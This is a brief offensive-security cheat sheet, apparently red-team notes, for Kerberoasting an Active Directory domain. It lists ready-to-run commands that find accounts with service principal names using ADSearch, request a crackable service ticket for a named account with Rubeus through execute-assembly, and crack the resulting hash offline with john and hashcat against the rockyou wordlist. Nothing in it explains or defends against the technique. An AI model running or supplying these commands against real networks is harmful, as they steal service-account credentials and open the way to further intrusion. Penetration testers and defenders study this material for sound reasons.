# Get users that are kerberoastable in the Domain

```bash
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
```

---

# Kerberoast a specific user with Rubeus

```bash
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```

---

# Crack hashes from kerberoasted user

```bash
 john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt mssql_svc.hash
 hashcat -a 0 -m 13100 mssql_svc.hash /usr/share/wordlists/rockyou.txt
```

